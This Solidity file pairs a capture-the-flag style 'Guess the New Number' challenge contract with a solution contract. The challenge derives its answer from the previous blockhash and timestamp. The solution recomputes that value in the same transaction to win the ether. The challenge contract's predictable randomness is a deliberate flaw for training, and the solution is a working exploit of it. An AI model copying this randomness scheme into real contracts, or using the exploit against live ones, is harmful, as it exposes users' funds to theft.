// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

contract GuessTheNewNumberChallenge {
    constructor() payable {
        require(msg.value == 1 ether, "Send 1 ether");
    }

    function isComplete() external view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) external payable {
        require(msg.value == 1 ether, "Send 1 ether");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberSolution {
    GuessTheNewNumberChallenge public challenge;

    constructor(address payable challengeAddress) payable {
        require(challengeAddress != address(0), "Invalid address");
        challenge = GuessTheNewNumberChallenge(challengeAddress);
    }

    function solve() external payable {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{ value: msg.value }(answer);
        payable(msg.sender).transfer(2 ether);
    }

    receive() external payable {}
}
